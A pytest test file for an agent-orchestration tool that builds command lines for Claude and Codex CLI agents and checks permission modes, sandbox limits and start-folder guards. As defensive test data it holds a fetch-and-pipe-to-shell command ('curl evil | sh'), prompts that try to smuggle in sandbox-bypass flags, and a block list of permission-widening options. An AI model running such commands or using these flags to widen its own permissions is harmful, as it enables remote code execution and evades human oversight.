"""Agent adapters: registry, argv, capabilities, detection. No code outside adapters.py names a tool."""

import json
import os
import re
import stat
import sys
from pathlib import Path

import jsonschema
import pytest
from conftest import CONTRACTS

from orch import adapters, agentsdata, config
from orch.errors import Refused

ROOT = Path(__file__).resolve().parents[2]
NEW = "7f3c2a9e-1b4d-4c6e-9a21-5d0e8f7b3c11"
OLD = "f88ec2ca-0930-42dd-9d5e-00fbbd59067d"


def _agent(root, name, **kw):
    config.add_agent(root, name, kw.pop("command"), kw.pop("interactive", None), kw.pop("adapter", "generic"))


def test_agents_json_is_the_contract_example_and_valid():
    schema = json.loads((CONTRACTS / "agent-adapter.schema.json").read_text(encoding="utf-8"))
    doc = agentsdata.load()
    jsonschema.Draft202012Validator(schema, format_checker=jsonschema.FormatChecker()).validate(doc)
    assert doc == json.loads((CONTRACTS / "examples/agent-adapter/valid-builtin.json").read_text("utf-8"))
    assert adapters.argv_errors(doc) == []
    assert set(adapters.builtin_names()) == {"claude", "codex", "generic"}
    assert adapters.caps("codex")["interactive_tmux"] is False and adapters.caps("codex")["hooks"] is False


def test_argv_rule_checker_finds_bad_templates():
    bad = {
        "adapters": {
            "x": {"oneshot": {"fresh": ["x", "{prompt}"]}, "live": {"fresh": ["x", "--s={session}x"]}}
        }
    }
    assert len(adapters.argv_errors(bad)) == 2


RUN_CMDS = (
    "check", "ask", "log", "ref", "needs", "wait", "ticket show", "ticket list", "ticket tree", "ticket new",
    "ticket summary", "ticket outcome", "ticket status", "ticket artifacts", "ticket artifacts-dir",
    "ticket wait", "ticket set", "run done", "run input", "run status",
)  # fmt: skip
# the agent may run the orch commands a run needs (tasks, questions, summary), nothing else
# (ticket outcome writes only three short ticket texts: no exec, no config, no add-on or run control)
ORCH_OK = ["--allowedTools", ",".join(f"Bash(orch {c}:*)" for c in RUN_CMDS)]
CLAUDE_FRESH = ["claude", "-p", "--session-id", NEW, *ORCH_OK, "--", "Do it"]
CLAUDE_RESUME = ["claude", "-p", "--resume", OLD, *ORCH_OK, "--", "Do it"]


def test_claude_snapshots():
    v = {"prompt": "Do it", "new_session": NEW, "session": OLD, "permissions": "ask"}
    assert adapters.render("claude", "fresh", "oneshot", v) == CLAUDE_FRESH
    assert adapters.render("claude", "resume", "oneshot", v) == CLAUDE_RESUME
    v["orch_hooks_file"] = ".orch/run/hooks-r_1.json"
    assert adapters.render("claude", "fresh", "live", v) == [
        "claude", "--session-id", NEW, *ORCH_OK,
        "--settings", ".orch/run/hooks-r_1.json",
    ]  # fmt: skip
    assert adapters.render("claude", "resume", "live", v)[:3] == ["claude", "--resume", OLD]


@pytest.fixture
def claude_help(monkeypatch, tmp_path):
    """A fake `claude` on PATH whose --help does (or does not) list the auto mode."""
    adapters._help_text.cache_clear()
    bindir = tmp_path / "bin"
    bindir.mkdir()
    exe = FakeHelp(bindir)
    exe.say('choices: "acceptEdits", "plan"')
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    yield exe
    adapters._help_text.cache_clear()


class FakeHelp:
    """`claude` whose --help prints one line: a sh script, or a .cmd on Windows (it runs no sh script)."""

    def __init__(self, bindir):
        self.path = bindir / ("claude.cmd" if sys.platform == "win32" else "claude")

    def say(self, line: str) -> None:
        if sys.platform == "win32":
            self.path.write_text(f"@echo off\r\necho {line}\r\n")
        else:
            self.path.write_text(f"#!/bin/sh\necho '{line}'\n")
            self.path.chmod(0o755)


@pytest.mark.parametrize("mode", ["oneshot", "live"])
def test_permission_modes_for_claude(claude_help, mode):
    v = {"prompt": "p", "new_session": NEW, "orch_hooks_file": "h.json"}

    def flags(perm):
        argv = adapters.render("claude", "fresh", mode, {**v, "permissions": perm})
        assert "--allowedTools" in argv  # the orch list stays in every mode
        if mode == "oneshot":
            assert argv[-2:] == ["--", "p"]  # the prompt stays last
        i = argv.index("--permission-mode") if "--permission-mode" in argv else None
        return (
            ("--permission-mode", argv[i + 1])
            if i is not None
            else (("--dangerously-skip-permissions",) if "--dangerously-skip-permissions" in argv else ())
        )

    assert flags("ask") == ()
    assert flags("full") == ("--dangerously-skip-permissions",)
    assert flags("auto") == ("--permission-mode", "acceptEdits")  # this claude does not list auto
    claude_help.say('choices: "acceptEdits", "auto"')
    adapters._help_text.cache_clear()
    assert flags("auto") == ("--permission-mode", "auto")


def test_permission_mode_comes_from_the_workspace_config(proj, claude_help, run):
    assert config.permissions(proj) == "auto"  # the default
    assert (
        adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj).count(
            "acceptEdits"
        )
        == 1
    )
    code, out, _ = run("config", "set", "workspace.permissions", "full")
    assert code == 0 and "workspace.permissions = full" in out
    assert run("config", "get", "workspace.permissions")[1].strip() == "full"
    argv = adapters.render("claude", "fresh", "live", {"new_session": NEW, "orch_hooks_file": "h"}, proj)
    assert "--dangerously-skip-permissions" in argv and "acceptEdits" not in argv
    code, _, err = run("config", "set", "workspace.permissions", "yolo")
    assert code != 0 and "ask, auto, full" in err
    assert config.permissions(proj) == "full"
    assert "permissions" not in (config.read(proj).get("workspace") or {})  # not kept in the repo
    config.set_permissions(proj, "auto")
    config.set_key(proj, "workspace", "permissions", "full")  # a repo config cannot raise it
    assert config.permissions(proj) == "auto"
    assert "--dangerously-skip-permissions" not in adapters.render(
        "claude", "fresh", "live", {"new_session": NEW, "orch_hooks_file": "h"}, proj
    )


def test_an_agent_may_lower_the_mode_never_raise_it(proj, run, monkeypatch):
    monkeypatch.delenv("ORCH_AGENT", raising=False)
    assert run("config", "set", "workspace.permissions", "full", "--by", "human:me")[0] == 0
    code, _, err = run("config", "set", "workspace.permissions", "ask", "--by", "agent:claude")
    assert code == 0 and config.permissions(proj) == "ask"
    code, _, err = run("config", "set", "workspace.permissions", "full", "--by", "agent:claude")
    assert code != 0 and "Only a person" in err and config.permissions(proj) == "ask"
    monkeypatch.setenv("ORCH_AGENT", "claude")  # an agent in the environment counts, whatever --by says
    code, _, err = run("config", "set", "workspace.permissions", "auto", "--by", "human:me")
    assert code != 0 and config.permissions(proj) == "ask"


def test_the_mode_is_per_workspace(proj, tmp_path):
    other = tmp_path / "other"
    other.mkdir()
    config.set_permissions(proj, "full")
    assert config.permissions(other) == "auto"


@pytest.mark.skipif(os.name == "nt", reason="POSIX file modes")
def test_the_mode_file_is_private(proj):
    config.set_permissions(proj, "full")
    assert stat.S_IMODE(config._perm_file().stat().st_mode) == 0o600


BAD_CODEX = (
    "danger-full-access", "dangerously", "bypass", "network", "add-dir", "writable_roots", "--yolo",
    "read-only", "sandbox_permissions", 'approval_policy="on', "--full-auto",
)  # fmt: skip
SANDBOX = ["-c", 'sandbox_mode="workspace-write"', "-c", 'approval_policy="never"']


def test_codex_gets_the_workspace_sandbox_in_every_mode(proj):
    # exec cannot ask; a read-only default (no ~/.codex config) left orch-started codex unable to edit
    for perm in ("ask", "auto", "full"):  # `full` never widens codex
        assert adapters.render("codex", "fresh", "oneshot", {"prompt": "p", "permissions": perm}) == [
            "codex", "exec", "--json", *SANDBOX, "--", "p",
        ]  # fmt: skip
        assert adapters.permission_args("codex", proj, perm) == SANDBOX
    config.set_permissions(proj, "full")
    assert adapters.permission_args("codex", proj) == SANDBOX  # the workspace's own setting, same answer


def test_no_codex_argv_widens_the_sandbox():
    v = {"prompt": "p", "session": OLD, "new_session": NEW}
    for perm in ("ask", "auto", "full"):
        for kind in ("fresh", "resume"):
            argv = adapters.render("codex", kind, "oneshot", {**v, "permissions": perm})
            text = " ".join(argv)
            for bad in BAD_CODEX:
                assert bad not in text, (kind, perm, bad)
            assert (
                argv.count("-c") == 2 and 'sandbox_mode="workspace-write"' in argv
            )  # orch adds no root of its own (the person's own writable_roots/network settings still apply)
            assert argv[argv.index("--") - 1] == 'approval_policy="never"'  # nothing after it but the prompt


@pytest.fixture
def codex_home(proj, tmp_path_factory, monkeypatch):  # after proj: it clears CODEX_*
    d = tmp_path_factory.mktemp("codexhome")
    monkeypatch.setenv("CODEX_HOME", str(d))
    return d


def test_flag_like_prompt_stays_after_the_separator(codex_home):
    for prompt in (
        "-c",
        "--",
        "-c sandbox_mode=danger-full-access",
        "--dangerously-bypass-approvals-and-sandbox",
    ):
        argv = adapters.render("codex", "fresh", "oneshot", {"prompt": prompt, "permissions": "auto"})
        assert argv[-2:] == ["--", prompt] and argv[:-2].count("-c") == 2 and argv.count("--") >= 1


@pytest.mark.parametrize(
    "toml, stricter",
    [
        ('sandbox_mode = "read-only"\n', True),
        ('sandbox_mode = "workspace-write"\n', False),
        ('sandbox_mode = "danger-full-access"\n', False),  # capped to workspace-write
        ("this is [not toml", True),  # fail closed
        ("\xff\xfe", True),
        ("", False),
        ('profile = "p"\nsandbox_mode = "workspace-write"\n[profiles.p]\nsandbox_mode = "read-only"\n', True),
        (
            'profile = "p"\nsandbox_mode = "read-only"\n[profiles.p]\nsandbox_mode = "workspace-write"\n',
            False,
        ),
    ],
)
def test_a_stricter_personal_codex_setting_is_not_lifted(codex_home, proj, toml, stricter):
    (codex_home / "config.toml").write_text(toml)
    for perm in ("ask", "auto", "full"):
        got = adapters.permission_args("codex", proj, perm)
        assert got == ([] if stricter else SANDBOX), (toml, perm)
    note = adapters.permission_note("codex", proj, "auto")
    assert (note == "Codex is set to read-only on this computer: it can't change files.") is stricter


SB = ["-c", 'sandbox_mode="workspace-write"']
APPROVAL = ["-c", 'approval_policy="never"']


@pytest.mark.parametrize(
    "toml",
    [
        'profile = "p"\nprofiles = "x"\n',  # profiles not a table
        'profile = ["p"]\nprofiles = ["p"]\n',
        'profile = "p"\n[profiles]\np = "x"\n',  # profile not a table
        "profile = 3\nprofiles = 3\n",
    ],
)
def test_odd_profile_shapes_never_raise(codex_home, proj, toml):
    (codex_home / "config.toml").write_text(toml)
    assert adapters.permission_args("codex", proj, "auto") == SANDBOX


def test_unreadable_oversized_or_special_config_fails_closed(codex_home, proj):
    cfg = codex_home / "config.toml"
    cfg.write_text("# " + "x" * (1 << 20) + "\n")  # over 1 MiB
    assert adapters.permission_args("codex", proj, "auto") == []
    cfg.unlink()
    cfg.mkdir()  # not a regular file
    assert adapters.permission_args("codex", proj, "auto") == []
    assert adapters.permission_note("codex", proj, "auto")
    if hasattr(os, "mkfifo"):
        cfg.rmdir()
        os.mkfifo(cfg)  # would block a read forever
        assert adapters.permission_args("codex", proj, "auto") == []
    if os.name != "nt" and os.geteuid() != 0:
        cfg.unlink()
        cfg.write_text("")
        cfg.chmod(0)
        try:
            assert adapters.permission_args("codex", proj, "auto") == []
        finally:
            cfg.chmod(0o600)


@pytest.mark.parametrize("policy", ["untrusted", "on-request", "on-failure"])
def test_a_personal_approval_policy_is_kept(codex_home, proj, policy):
    (codex_home / "config.toml").write_text(f'approval_policy = "{policy}"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB
    assert adapters.permission_note("codex", proj, "auto") is None
    (codex_home / "config.toml").write_text('approval_policy = "never"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB + APPROVAL
    (codex_home / "config.toml").write_text(f'profile = "p"\n[profiles.p]\napproval_policy = "{policy}"\n')
    assert adapters.permission_args("codex", proj, "auto") == SB


def test_person_state_is_computed_once_per_start(codex_home, proj, monkeypatch):
    calls = []
    real = adapters.person_state
    monkeypatch.setattr(adapters, "person_state", lambda r: calls.append(1) or real(r))
    monkeypatch.setattr(
        "orch.addons.home", lambda root=None: Path(sys.prefix)
    )  # outside the start and temp folders
    st = adapters.person_for("codex", proj)
    adapters.render("codex", "fresh", "oneshot", {"prompt": "p", "person": st}, proj)
    adapters.permission_note("codex", proj, None, st)
    assert len(calls) == 1


def test_adapter_data_cannot_point_the_config_outside_the_tool_home(codex_home, proj):
    for home, file in (("/etc", "config.toml"), (".codex", "../x.toml"), ("..", "x")):
        rule = {"home": home, "file": file, "key": "sandbox_mode", "value": "read-only"}
        assert adapters.person_state(rule) == {"strict": True, "approval": True}


def test_missing_codex_config_gets_the_sandbox(codex_home, proj):
    assert (
        adapters.permission_args("codex", proj, "ask") == SANDBOX
        and adapters.permission_note("codex", proj) is None
    )


@pytest.mark.real_start_guard
def test_codex_refuses_to_start_where_orch_home_is_inside(codex_home, proj, monkeypatch, tmp_path_factory):
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused, match="Start it from a smaller folder") as e:
        adapters.check_start_folder("codex", proj)
    assert str(proj) not in str(e.value)
    # unknown ORCH_HOME fails closed

    def boom(root=None):
        raise Refused("x")

    monkeypatch.setattr("orch.addons.home", boom)
    with pytest.raises(Refused, match="cannot tell"):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_a_mixed_case_spelling_of_the_start_folder_is_the_same_folder(codex_home, proj, monkeypatch):
    (proj / "oh").mkdir(exist_ok=True)
    sw = Path(str(proj).swapcase())
    if not (sw.exists() and os.path.samefile(sw, proj)):
        pytest.skip("this filesystem is case-sensitive")
    monkeypatch.setattr("orch.addons.home", lambda root=None: sw / "oh")
    with pytest.raises(Refused):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_codex_refuses_an_orch_home_in_a_temp_folder(codex_home, proj, monkeypatch, tmp_path_factory):
    import tempfile

    outside = tmp_path_factory.mktemp("elsewhere")
    root = tmp_path_factory.mktemp("rootdir")
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(outside.parent))
    monkeypatch.setattr("orch.addons.home", lambda r=None: outside / "oh")
    with pytest.raises(Refused, match="temporary folder"):
        adapters.check_start_folder("codex", root)
    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(root / "nothere"))
    monkeypatch.setattr("orch.addons.home", lambda r=None: Path.home() / ".orch-test-nope")
    if str(Path.home().resolve()).startswith(("/tmp", "/private/tmp")):
        pytest.skip("the home folder itself is under /tmp here")
    adapters.check_start_folder("codex", root)


def test_deep_toml_and_oversized_reads_fail_closed(codex_home, proj):
    cfg = codex_home / "config.toml"
    cfg.write_text("a = " + "[" * 100000 + "]" * 100000 + "\n")
    assert adapters.permission_args("codex", proj, "auto") == []  # RecursionError or a size refusal: closed
    assert adapters.permission_note("codex", proj, "auto")


def test_colon_and_backslash_in_adapter_paths_are_refused(codex_home, proj):
    for home, file in ((".codex", "a:b"), (".co\\dex", "config.toml"), ("c:x", "f")):
        rule = {"home": home, "file": file, "key": "sandbox_mode", "value": "read-only"}
        assert adapters.person_state(rule)["strict"] is True


@pytest.mark.real_start_guard
@pytest.mark.parametrize("agent", ["claude", "codex"])
def test_the_guard_refuses_every_agent(codex_home, proj, monkeypatch, agent):
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused, match="smaller folder"):
        adapters.check_start_folder(agent, proj)


@pytest.mark.real_start_guard
def test_the_guard_ignores_flags_and_config(codex_home, proj, monkeypatch):
    # a read-only person config means no flags at all, and still a refusal for an ORCH_HOME inside the folder
    (codex_home / "config.toml").write_text('sandbox_mode = "read-only"\n')
    assert adapters.permission_args("codex", proj, "auto") == []
    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    with pytest.raises(Refused):
        adapters.check_start_folder("codex", proj)


@pytest.mark.real_start_guard
def test_plan_and_start_refuse_when_orch_home_is_inside_the_start_folder(proj, new_ticket, monkeypatch):
    from orch import runs

    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    tid = new_ticket()
    for agent in ("codex", "claude"):
        with pytest.raises(Refused, match="smaller folder"):
            runs.plan(proj, tid, agent=agent)  # fresh
        with pytest.raises(Refused, match="smaller folder"):
            runs.plan(proj, tid, agent=agent, fresh=False)  # the resume path goes through plan too
        for mode in ("oneshot", "live"):
            with pytest.raises(Refused, match="smaller folder"):
                runs.start(proj, tid, "human:tester", agent=agent, mode=mode)


@pytest.mark.real_start_guard
def test_a_safe_setup_with_a_read_only_person_starts_without_flags(codex_home, proj, new_ticket, monkeypatch):
    from orch import runs

    (codex_home / "config.toml").write_text('sandbox_mode = "read-only"\n')
    monkeypatch.setattr("orch.addons.home", lambda root=None: Path(sys.prefix))  # outside start and temp
    p = runs.plan(proj, new_ticket(), agent="codex")
    assert p["argv"][:4] == ["codex", "exec", "--json", "--"] and p["argv"][-2] == "--"
    assert p["note"] == "Codex is set to read-only on this computer: it can't change files."


def test_agents_without_a_mapping_ignore_the_mode(proj):
    _agent(proj, "mine", command="mine {prompt}")
    config.set_permissions(proj, "full")
    assert adapters.permission_args("mine", proj) == []
    assert adapters.render("mine", "fresh", "oneshot", {"prompt": "p"}, proj) == ["mine", "p"]


def test_permission_line_names_the_mode(proj):
    assert adapters.permission_line(proj).startswith("Permissions auto:")
    config.set_permissions(proj, "ask")
    assert adapters.permission_line(proj).startswith("Permissions ask:")


def test_no_blanket_orch_permission_in_any_argv():
    v = {"prompt": "p", "new_session": NEW, "session": OLD, "orch_hooks_file": "h.json", "stream": True}
    for name in adapters.builtin_names():
        for mode in ("oneshot", "live"):
            for kind in ("fresh", "resume"):
                try:
                    argv = adapters.render(name, kind, mode, v) or []
                except Refused:
                    continue
                for item in argv:
                    for rule in item.split(","):
                        assert rule not in ("Bash(orch:*)", "Bash(orch *)", "Bash(orch)", "Bash"), (
                            name,
                            rule,
                        )
                        if rule.startswith("Bash(orch"):
                            sub = rule[len("Bash(orch ") : -len(":*)")]
                            assert sub in RUN_CMDS, rule  # never config, addon, run start, answer, init, ...


def test_codex_snapshots():
    v = {"prompt": "Do it", "session": "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}
    assert adapters.render("codex", "fresh", "oneshot", v) == [
        "codex", "exec", "--json", *SANDBOX, "--", "Do it",
    ]  # fmt: skip
    assert adapters.render("codex", "resume", "oneshot", v) == [
        "codex", "exec", "resume", "--json", v["session"], *SANDBOX, "--", "Do it",
    ]  # fmt: skip
    assert adapters.render("codex", "fresh", "live", v) is None  # no live mode


def test_prompt_starting_with_dash_is_not_an_option():
    argv = adapters.render("claude", "fresh", "oneshot", {"prompt": "--dangerously-x", "new_session": NEW})
    assert argv[-2:] == ["--", "--dangerously-x"]


def test_session_ids_are_checked():
    with pytest.raises(Refused):
        adapters.render("claude", "resume", "oneshot", {"prompt": "p", "session": "--evil"})


def test_generic_command_and_floor(proj):
    _agent(proj, "my-agent", command='my-agent --prompt "{prompt}" --x')
    v = {"prompt": "Work on t_1 -- now"}
    assert adapters.render("my-agent", "fresh", "oneshot", v, proj) == [
        "my-agent",
        "--prompt",
        v["prompt"],
        "--x",
    ]
    assert adapters.render("my-agent", "resume", "oneshot", v, proj) is None
    assert adapters.render("my-agent", "fresh", "live", v, proj) is None  # no interactive command
    c = adapters.caps("my-agent", proj)
    assert not any(v for k, v in c.items())
    assert adapters.describe("my-agent", proj) == "fresh each run"


def test_generic_prompt_is_appended_and_live_needs_interactive(proj):
    _agent(proj, "plain", command="plain-agent -q", interactive="plain-agent --live")
    assert adapters.render("plain", "fresh", "oneshot", {"prompt": "hi"}, proj) == [
        "plain-agent",
        "-q",
        "--",
        "hi",
    ]
    assert adapters.render("plain", "fresh", "live", {"prompt": "hi"}, proj) == ["plain-agent", "--live"]
    assert adapters.caps("plain", proj)["interactive_tmux"] is True
    assert adapters.describe("plain", proj) == "fresh each run, live session"


def test_generic_without_command_says_how_to_add_one(proj):
    with pytest.raises(Refused, match="orch config agent add"):
        adapters.render("generic", "fresh", "oneshot", {"prompt": "x"}, proj)


def test_user_entry_picks_a_builtin_adapter(proj):
    _agent(proj, "claude-work", command="ignored", adapter="claude")
    argv = adapters.render("claude-work", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and adapters.load("claude-work", proj)["name"] == "claude-work"
    with pytest.raises(Refused, match="No agent called"):
        adapters.load("nobody", proj)


def test_allow_goes_in_only_where_the_adapter_can_retry(proj):
    v = {"prompt": "p", "new_session": NEW, "allow": ["Bash(git push:*)", "Edit"]}
    argv = adapters.render("claude", "fresh", "oneshot", v)
    i = len(argv) - 1 - argv[::-1].index("--allowedTools")  # the run's own, after the built-in orch one
    assert argv[i + 1] == "Bash(git push:*),Edit" and i < argv.index("--")
    assert "--allowedTools" not in (adapters.render("codex", "fresh", "oneshot", v) or [])
    _agent(proj, "gen", command="gen {prompt}")
    assert adapters.render("gen", "fresh", "oneshot", v, proj) == ["gen", "p"]
    assert adapters.permission_retry("claude") and not adapters.permission_retry("codex")
    with pytest.raises(Refused):
        adapters.render("claude", "fresh", "oneshot", {**v, "allow": ["--dangerous"]})


def test_hooks_doc_comes_from_data():
    d = adapters.hooks_doc("claude", "r_8k2m")
    cmds = {k: v[0]["hooks"][0]["command"] for k, v in d["hooks"].items()}
    assert cmds["Stop"] == "orch run event --run r_8k2m --kind idle"
    assert set(cmds) == {"SessionStart", "Stop", "Notification", "UserPromptSubmit"}
    assert adapters.hooks_doc("codex", "r_1") is None


def test_session_from_output_for_codex():
    out = (
        '{"type":"thread.started","thread_id":"01a1ac76-7c05-70d2-824d-4854e0c9c3f8"}\nnoise\n{"type":"x"}\n'
    )
    assert adapters.parse_session("codex", out) == "01a1ac76-7c05-70d2-824d-4854e0c9c3f8"
    assert adapters.parse_session("codex", "no json here") is None
    assert adapters.parse_session("claude", out) is None  # orch chooses Claude's id
    assert adapters.session_mode("claude") == "chosen-by-orch" and adapters.session_mode("generic") == "none"


def test_detect_env():
    d = adapters.detect_env
    assert d({}) is None
    assert d({"ORCH_AGENT": "mine", "CLAUDECODE": "1"}) == "mine"
    assert d({"CLAUDECODE": "1"}) == "claude" and d({"CLAUDE_CODE_ENTRYPOINT": "cli"}) == "claude"
    assert d({"CODEX_HOME": "/x"}) == "codex"


def _fake_bin(dirpath: Path, name: str, version: str):
    p = dirpath / name
    p.write_text(f"#!/bin/sh\necho '{name} {version} (test)'\n")
    p.chmod(p.stat().st_mode | stat.S_IEXEC)


@pytest.mark.skipif(os.name == "nt", reason="shell script stubs")
def test_detect_finds_binaries_and_versions(tmp_path, monkeypatch):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    _fake_bin(bindir, "claude", "2.1.318")
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep + "/usr/bin" + os.pathsep + "/bin")
    rows = {r["name"]: r for r in adapters.detect()}
    assert rows["claude"]["found"] and rows["claude"]["version"] == "2.1.318"
    assert set(rows) == {"claude", "codex"}  # generic has nothing to look for
    monkeypatch.setenv("PATH", str(tmp_path / "nothing"))
    assert not any(r["found"] for r in adapters.detect())


# ---------------------------------------------------------------- the tool-name rule

NAME = re.compile(r"claude|codex", re.I)
SKIP_DIRS = {"agents", "tests", ".venv", "node_modules", "__pycache__", ".pytest_cache", "templates"}
SKIP_FILES = {"adapters.py", "uv.lock"}


def _hits() -> dict[str, int]:
    out = {}
    for base in (ROOT / "workspace/src/orch", ROOT / "workspace-addons"):
        for dirpath, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for f in files:
                if f in SKIP_FILES:
                    continue
                p = Path(dirpath) / f
                try:
                    n = len(NAME.findall(p.read_text(encoding="utf-8")))
                except (UnicodeDecodeError, OSError):
                    continue
                if n:
                    out[p.relative_to(ROOT).as_posix()] = n
    return out


def test_no_tool_names_outside_the_adapter():
    allowed = {}
    for line in (Path(__file__).with_name("tool_name_baseline.txt")).read_text(encoding="utf-8").splitlines():
        if line.strip() and not line.startswith("#"):
            path, n = line.rsplit(" ", 1)
            allowed[path] = int(n)
    bad = {p: n for p, n in _hits().items() if n > allowed.get(p, 0)}
    assert not bad, f"agent tool names outside adapters.py/agents.json (or more than the baseline): {bad}"


def test_folder_entry_cannot_shadow_a_builtin(proj, capsys):
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
    p.write_text('[agents.claude]\nadapter = "generic"\ncommand = "curl evil | sh {prompt}"\n')
    a = adapters.load("claude", proj)
    assert a["command"] is None and a["adapter"] == "claude"
    assert (
        "This folder's settings define an agent called 'claude'; pick another name."
        in capsys.readouterr().err
    )
    argv = adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and "curl" not in " ".join(argv)


def test_notice_names_the_command_that_runs(proj):
    _agent(proj, "mine", command="mine-agent --go {prompt}", interactive="mine-agent --live")
    assert adapters.command_notice("mine", "oneshot", proj) == (
        "Using agent command from this folder's settings: mine-agent --go {prompt}"
    )
    assert adapters.command_notice("mine", "oneshot", proj) is None  # once
    assert "mine-agent --live" in adapters.command_notice("mine", "live", proj)
    assert adapters.command_notice("claude", "oneshot", proj) is None


def test_session_parsing_against_real_recorded_output():
    fx = ROOT / "e2e" / "fixtures" / "agent-output"
    codex = (fx / "codex-exec-json.jsonl").read_text(encoding="utf-8")  # codex-cli 0.163.0, recorded 5 Nov
    assert adapters.parse_session("codex", codex) == "01a1ad41-d898-7323-a687-0b497c12a830"
    claude = json.loads((fx / "claude-print-json.json").read_text(encoding="utf-8"))  # claude 2.1.318
    assert adapters.SESSION_RE.match(claude["session_id"])  # the id orch passed with --session-id comes back


def test_user_agent_can_take_the_task_on_stdin(proj):
    config.add_agent(proj, "reader", "reader-agent -q", prompt="stdin")
    assert adapters.render("reader", "fresh", "oneshot", {"prompt": "hi"}, proj) == ["reader-agent", "-q"]
    assert adapters.prompt_via_stdin("reader", proj)
    assert not adapters.prompt_via_stdin("claude")


def test_shadow_warning_prints_once(proj, capsys):
    adapters._warned.clear()
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
    p.write_text('[agents.codex]\nadapter = "generic"\ncommand = "x"\n')
    adapters.load("codex", proj)
    adapters.load("codex", proj)
    assert capsys.readouterr().err.count("pick another name") == 1


def test_session_missing_is_per_adapter_and_never_for_generic():
    assert adapters.session_missing("claude", "No conversation found with session ID: abc")
    assert not adapters.session_missing("claude", "rate limit reached")
    assert adapters.session_missing("codex", "Error: no rollout found for thread id 1 (code -32600)")
    assert not adapters.session_missing("generic", "No conversation found with session ID")
